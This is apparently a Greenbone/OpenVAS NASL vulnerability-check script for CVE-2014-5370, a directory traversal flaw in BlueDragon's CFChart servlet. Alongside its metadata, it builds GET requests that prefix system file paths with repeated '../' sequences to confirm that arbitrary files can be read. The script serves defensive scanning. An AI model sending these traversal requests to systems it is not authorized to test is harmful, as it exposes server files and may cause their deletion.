# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805068");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-05-06 11:43:39 +0530 (Wed, 06 May 2015)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2014-5370");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("BlueDragon CFChart Servlet < 7.1.1.18527 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("BlueDragon/banner");

  script_tag(name:"summary", value:"BlueDragon CFChart Servlet is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to the /cfchart.cfchart script not properly
  sanitizing user input, specifically path traversal style attacks (e.g. '../'). With a specially
  crafted request, a remote attacker can gain access to or delete arbitrary files.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to download
  arbitrary files from an affected server and to also potentially see those files deleted after
  retrieval.");

  script_tag(name:"affected", value:"BlueDragon CFChart Servlet version 7.1.1.17759 and probably
  prior.");

  script_tag(name:"solution", value:"Update to version 7.1.1.18527 or later.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Apr/49");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/131504");
  script_xref(name:"URL", value:"https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-5370/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port);
if (!banner || "BlueDragon Server" >!< banner)
  exit(0);

files = traversal_files();

res = http_get_cache(port: port, item: "/cfchart.cfchart");
if (!res || res !~ "^HTTP/1\.[01] 200")
  exit(0);

foreach file (keys(files)) {
  url = "/cfchart.cfchart?" +  crap(data: "../", length: 3 * 15) + files[file];

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
